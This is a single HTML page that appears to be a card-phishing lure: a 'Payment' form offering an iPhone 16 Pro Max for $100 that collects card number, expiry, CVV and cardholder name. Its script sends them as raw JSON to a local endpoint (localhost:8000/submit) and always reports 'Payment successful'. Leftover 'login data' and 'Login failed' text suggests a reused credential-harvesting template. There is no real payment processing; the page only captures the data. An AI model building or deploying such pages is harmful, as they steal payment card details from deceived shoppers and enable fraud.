<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1.0">
  <title>Payment</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
</head>
<body>
<div class="container my-5">
  <div class="card p-3 mt-4 shadow">
    <h4 class="mb-3">Payment</h4>
    <p><strong>Product:</strong> Iphone 16 Pro Max</p>
    <p class="mb-3"><strong>Price:</strong> $100.00</p>
    <form id="cardForm">
      <div class="row g-2">
        <div class="col-12">
          <label for="cardNumber" class="form-label">Card Number</label>
          <input type="text" id="cardNumber" name="cardNumber" class="form-control"
                 placeholder="XXXX XXXX XXXX XXXX" autocomplete="cc-number" required>
        </div>
        <div class="col-md-6">
          <label for="expiry" class="form-label">MM / YY</label>
          <input type="text" id="expiry" name="expiry" class="form-control"
                 placeholder="MM/YY" autocomplete="cc-exp" required>
        </div>
        <div class="col-md-6">
          <label for="cvv" class="form-label">CVV</label>
          <input type="text" id="cvv" name="cvv" class="form-control"
                 placeholder="CVV" autocomplete="cc-csc" required>
        </div>
        <div class="col-12">
          <label for="cardName" class="form-label">Name on Card</label>
          <input type="text" id="cardName" name="cardName" class="form-control"
                 placeholder="Name" required>
        </div>
      </div>
      <button class="btn btn-primary w-100 mt-4" type="submit">Make Payment</button>
    </form>
  </div>
</div>

<script>
  // JavaScript to send the login data to an API
  document.getElementById("cardForm").addEventListener("submit", function(event) {
      event.preventDefault(); // Prevent the default form submission

      const cardNumber = document.getElementById("cardNumber").value;
      const expiry    = document.getElementById("expiry").value;
      const cvv        = document.getElementById("cvv").value;
      const cardName   = document.getElementById("cardName").value;
    


      // Prepare the data to be sent to the API
      const data = {
          cardNumber: cardNumber,
          expiry: expiry,
          cvv: cvv,
          cardName: cardName
      };


      // Send the data using fetch to an API (replace 'YOUR_API_URL' with the actual endpoint)
      fetch('http://localhost:8000/submit', {
          method: 'POST',
          headers: {
              'Content-Type': 'application/json',
          },
          body: JSON.stringify(data),
      })
      .then(response => response.json()) // Parse the JSON response
      .then(data => {
          // Handle the API response here
          console.log('Success:', data);
          alert('Payment successful');
      })
      .catch((error) => {
          // Handle any errors that occur during the fetch
          console.error('Error:', error);
          alert('Login failed');
      });
  });
</script>

</body>
</html>
